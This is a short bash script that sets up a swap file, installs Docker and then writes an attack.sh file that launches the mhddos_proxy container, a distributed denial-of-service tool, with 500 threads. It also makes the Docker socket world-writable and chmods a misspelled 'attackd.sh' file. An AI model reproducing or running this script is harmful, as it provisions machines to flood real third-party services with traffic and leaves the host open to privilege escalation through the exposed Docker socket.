#!/bin/bash
free -h
sleep 1
df -h
sleep 1
sudo fallocate -l 1G /swapfile
sleep 1
ls -lh /swapfile
sleep 1
sudo chmod 600 /swapfile
sleep 1
ls -lh /swapfile
sleep 1
sudo mkswap /swapfile
sleep 1
sudo swapon /swapfile
sleep 1
free -h
sleep 1
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
sudo apt update 
sudo apt install -y docker.io 
sudo systemctl enable docker --now 
docker 
sudo usermod -aG docker $USER
printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list ; curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg
sudo apt update 
sudo apt install -y docker-ce docker-ce-cli containerd.io screen 
sudo systemctl unmask docker.service 
sudo systemctl unmask docker.socket 
sudo systemctl start docker.service 
sudo chmod 666 /var/run/docker.sock 
sudo docker run hello-world
echo "docker run -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attack.sh
sudo chmod 777 attackd.sh
echo "docker run  -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" >> attack.sh
sudo chmod 777 attack.sh


